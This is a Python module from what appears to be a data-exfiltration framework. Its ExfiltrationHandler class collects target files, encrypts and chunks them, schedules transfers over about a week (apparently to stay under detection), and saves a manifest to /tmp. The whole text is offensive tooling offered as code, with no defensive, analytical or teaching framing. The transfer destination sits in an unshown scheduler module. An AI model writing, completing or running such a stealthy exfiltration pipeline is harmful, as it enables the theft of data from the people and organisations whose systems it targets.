#!/usr/bin/env python3
"""Exfiltration Handler - Complete orchestration"""
from pathlib import Path
from typing import List
from ..core.file_manager import FileManager
from ..core.staging_area import StagingArea
from ..core.manifest import Manifest
from ..modules.encryption import FileEncryptor
from ..modules.chunking import FileChunker
from ..modules.scheduler import TransferScheduler

class ExfiltrationHandler:
    def __init__(self, session_id: str, schedule_hours: int = 168, chunk_size_mb: int = 10):
        self.session_id = session_id
        self.staging = StagingArea(session_id)
        self.manifest = Manifest(session_id)
        self.file_manager = FileManager(str(self.staging.staging_dir))
        self.encryptor = FileEncryptor()
        self.chunker = FileChunker(chunk_size_mb=chunk_size_mb)
        self.scheduler = TransferScheduler(schedule_hours=schedule_hours)
        self.staging.create()
    
    def execute_exfiltration(self, file_list: List[str]) -> bool:
        print(f"\n{'='*70}\nDATA EXFILTRATION FRAMEWORK\nSession: {self.session_id}\n{'='*70}")
        print(f"[*] Collecting {len(file_list)} files...")
        collected = self.file_manager.collect_files(file_list)
        for tf in collected:
            self.manifest.add_file(tf.to_dict())
        print(f"[+] Files collected: {len(collected)}")
        
        print("\n[*] Encrypting and chunking...")
        for tf in self.file_manager.get_all_files():
            enc_path = self.staging.get_encrypted_path(Path(tf.local_path).name)
            key_path = self.staging.get_key_path(Path(tf.local_path).name)
            _, key = self.encryptor.encrypt_file(Path(tf.local_path), enc_path, None)
            self.encryptor.save_key(key, key_path)
            tf.encrypted = True
            chunks = self.chunker.chunk_file(enc_path, self.staging.chunks_dir)
            tf.chunked = True
            tf.chunks = [{'index': c.chunk_index, 'path': str(c.chunk_path), 'size': c.size, 'hash': c.hash} for c in chunks]
            print(f"  ✓ {Path(tf.original_path).name}: {len(chunks)} chunks")
        
        print("\n[*] Scheduling transfers...")
        all_chunks = []
        for tf in self.file_manager.get_all_files():
            for ci in tf.chunks:
                all_chunks.append(type('obj', (object,), {'chunk_path': ci['path']})())
        jobs = self.scheduler.schedule_chunks(all_chunks)
        print(f"[+] Scheduled {len(jobs)} transfers over {self.scheduler.schedule_hours} hours")
        
        manifest_path = Path(f"/tmp/exfil_manifest_{self.session_id}.json")
        self.manifest.finalize()
        self.manifest.save(manifest_path)
        print(f"\n[*] Manifest saved: {manifest_path}")
        print(f"{'='*70}\nEXFILTRATION PREPARED\n{'='*70}")
        return True
